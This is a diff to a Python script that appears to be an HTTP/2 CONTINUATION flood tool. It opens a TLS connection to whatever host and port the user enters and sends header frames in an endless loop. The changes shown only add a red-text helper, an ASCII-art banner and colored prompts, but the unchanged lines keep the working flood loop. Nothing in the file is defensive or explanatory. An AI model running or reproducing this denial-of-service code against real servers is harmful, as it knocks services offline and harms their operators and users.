@@ -2,6 +2,11 @@ import socket
 import ssl
 from h2 import connection, config
 
+def color_red(text):
+    RED = "\033[91m"
+    RESET = "\033[0m"
+    return f"{RED}{text}{RESET}" 
+
 def continuation_flood(target, port):
     sock = socket.create_connection((target, port))
     ctx = ssl.create_default_context()
@@ -25,8 +30,16 @@ def continuation_flood(target, port):
     while True:
         conn.send_headers(conn.get_next_available_stream_id(), headers)
         sock.send(conn.data_to_send())
+print(color_red("""
+        _____.__                    .___
+  _____/ ____\  |   ____   ____   __| _/
+_/ ___\   __\|  |  /  _ \ /  _ \ / __ | 
+\  \___|  |  |  |_(  <_> |  <_> ) /_/ | 
+ \___  >__|  |____/\____/ \____/\____ | 
+     \/                              \/ 
 
-host = input("Enter target IP address or domain name: ")
-port = int(input("Enter port: "))
+"""))
+host = input(color_red("Enter target IP address or domain name: "))
+port = int(input(color_red("Enter port: ")))
 
 continuation_flood(host, port)
